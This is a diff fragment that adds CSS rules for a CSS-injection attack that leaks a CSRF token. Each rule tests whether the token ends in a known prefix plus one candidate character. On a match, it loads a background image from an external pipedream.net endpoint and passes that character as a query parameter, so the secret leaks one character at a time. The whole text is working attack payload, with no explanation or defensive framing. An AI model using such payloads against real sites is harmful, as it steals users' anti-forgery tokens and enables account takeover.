@@ -90,3 +90,11 @@ input[name="csrf"][value$="ruW-tjL1BWCdhbiOSCA7-"] {background: url(https://eopm
 input[name="csrf"][value$="ruW-tjL1BWCdhbiOSCA7_"] {background: url(https://eopmuiay9xwvw4n.m.pipedream.net?token=_);}
 input[name="csrf"][value$="ruW-tjL1BWCdhbiOSCA7<"] {background: url(https://eopmuiay9xwvw4n.m.pipedream.net?token=<);}
 input[name="csrf"][value$="ruW-tjL1BWCdhbiOSCA7>"] {background: url(https://eopmuiay9xwvw4n.m.pipedream.net?token=>);}
+input[name="csrf"][value$="ruW-tjL1BWCdhbiOSCA7 "] {background: url(https://eopmuiay9xwvw4n.m.pipedream.net?token= );}
+input[name="csrf"][value$="ruW-tjL1BWCdhbiOSCA7é"] {background: url(https://eopmuiay9xwvw4n.m.pipedream.net?token=é);}
+input[name="csrf"][value$="ruW-tjL1BWCdhbiOSCA7è"] {background: url(https://eopmuiay9xwvw4n.m.pipedream.net?token=è);}
+input[name="csrf"][value$="ruW-tjL1BWCdhbiOSCA7à"] {background: url(https://eopmuiay9xwvw4n.m.pipedream.net?token=à);}
+input[name="csrf"][value$="ruW-tjL1BWCdhbiOSCA7ç"] {background: url(https://eopmuiay9xwvw4n.m.pipedream.net?token=ç);}
+input[name="csrf"][value$="ruW-tjL1BWCdhbiOSCA7ù"] {background: url(https://eopmuiay9xwvw4n.m.pipedream.net?token=ù);}
+input[name="csrf"][value$="ruW-tjL1BWCdhbiOSCA7€"] {background: url(https://eopmuiay9xwvw4n.m.pipedream.net?token=€);}
+input[name="csrf"][value$="ruW-tjL1BWCdhbiOSCA7§"] {background: url(https://eopmuiay9xwvw4n.m.pipedream.net?token=§);}
